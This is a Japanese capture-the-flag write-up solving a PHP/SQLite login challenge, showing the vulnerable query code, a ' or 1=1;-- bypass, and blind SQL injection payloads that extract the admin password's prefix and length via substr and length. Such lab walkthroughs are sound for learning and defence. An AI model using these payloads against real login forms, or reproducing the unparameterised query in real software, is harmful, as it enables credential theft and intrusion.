自力解答ならず。  

``ID``に``admin``、``Pass``に``' or 1=1;--``を入力して送信。  
ヒントが表示される。  

```php
// Congratulations!
// It's too easy?
// Don't worry.
// The flag is admin's password.

// Hint:

<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
    
    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';
    
    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```

ここで詰まる。  

### 正解

Blind SQL Injection。SQLの結果の違いから正解を絞り込んでいく手法。徳丸本とかで見たことはあるけど、自分で実践するのは初めて。  

まずパスワードの先頭が``FLAG_``の形式になっているかを調べる。ちなみに``substr``の第二引数は1-indexed。  

```
' or substr((select pass from user where id = 'admin'), 1, 1) = 'F'; --
' or substr((select pass from user where id = 'admin'), 2, 1) = 'L'; --
' or substr((select pass from user where id = 'admin'), 3, 1) = 'A'; --
' or substr((select pass from user where id = 'admin'), 4, 1) = 'G'; --
' or substr((select pass from user where id = 'admin'), 5, 1) = '_'; --
```

上記のすべてで``Congratulations!``。パスワードは``FLAG_xxx``の形式で確定。  

次にパスワードの文字数を調べる。以下を``ID``欄に打ち込む。``Congratulations!``。  

```
' or (select length(pass) from user where id = 'admin') > 1;--
```

次は以下。``Login Failed``。  

```
' or (select length(pass) from user where id = 'admin') > 100;--
```

後は二分探索。``> 20``だと``Congratulations!``で``> 21``だと``Login Failed``だったので、パスワードは21文字。  

``FLAG_``の分を抜いた残りの16文字は総当たり。  

```bash
$ python3 crack.py
```

### 参考

- [SQLite Substr | SQLITE TUTORIAL](https://www.sqlitetutorial.net/sqlite-functions/sqlite-substr/)
- [Blind SQL injection | PortSwigger](https://portswigger.net/web-security/sql-injection/blind)
